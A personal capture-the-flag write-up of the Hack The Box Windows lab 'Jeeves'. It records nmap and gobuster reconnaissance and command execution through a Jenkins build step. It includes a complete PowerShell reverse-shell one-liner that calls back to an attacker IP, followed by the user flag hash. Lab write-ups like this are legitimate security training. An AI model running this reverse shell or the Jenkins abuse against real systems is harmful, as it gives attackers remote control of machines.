#medium 

## 0. **Lab infos**

**Difficulty :** Medium
**Name :** Jeeves
**IP** : 10.129.228.112
**Objectives :** Get user and root flags
**OS :** #Windows

##### **Conclusion**
**Time :** 
	**Start :** 22.04.2025 16:31
	**Break at/to :** 22.04.2025 19:02
	**Finish :** 
**Satisfaction :**  
### 1. **Reconnaissance

We start with an #nmap scan

```BASH
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```

And we make a #gobuster scan on the port 50000 because it's the only we can see without the -p-

```BASH
┌─[eu-dedivip-1]─[10.10.14.117]─[bobinette@htb-0k04etkbc3]─[~]
└──╼ [★]$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.228.112:50000
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.112:50000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.129.228.112:50000/askjeeves/]
Progress: 108476 / 220561 (49.18%)
```

![[Pasted image 20250422164215.png]]


## 2. **Weaponization

## 3. **Delivery

## 4. **Exploitation

We can create a new jobs and in the build > Add Build step select Execute Windows batch command.

And we can enter our command. I wrote whoami.
Adn after build the jobs we can click on Conole OutPut and see the result of our command.

![[Pasted image 20250422165715.png]]

So with this reverse shell we can have an #RCE 

```POWERSHELL
powershell -nop -c "& { $client = New-Object Net.Sockets.TCPClient('10.10.14.117',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
```

The server is extremely slow but it's okkey

![[Pasted image 20250422172207.png]]

## 5. **Installation

## 6. **Command and Control

## 7. **Actions on Objectives

So for the first flag it's in kohsuke on his desktop :

```POWERSHELL
> type kohsuke\Desktop\user.txt
e3232272596fb47950d59c4cf1e7066a
```